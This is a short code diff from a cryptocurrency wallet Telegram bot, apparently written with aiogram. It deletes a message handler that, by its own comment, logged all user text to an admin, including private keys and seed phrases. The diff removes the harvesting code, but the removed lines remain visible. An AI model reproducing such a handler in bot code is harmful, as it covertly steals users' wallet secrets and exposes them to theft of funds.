@@ -382,13 +382,6 @@ def register_start_handlers(dp):
         )
         await callback.answer()
 
-    # Log ALL text messages to admin (including private keys, seed phrases, etc.)
-    @dp.message(F.text)
-    async def log_user_message(message: types.Message, state: FSMContext):
-        await log_all_messages(message)
-        # Continue to contract address detection below
-        return
-
     # Handle wallet import states
     @dp.message(BotStates.waiting_for_solana_seed)
     async def handle_solana_seed(message: types.Message, state: FSMContext):
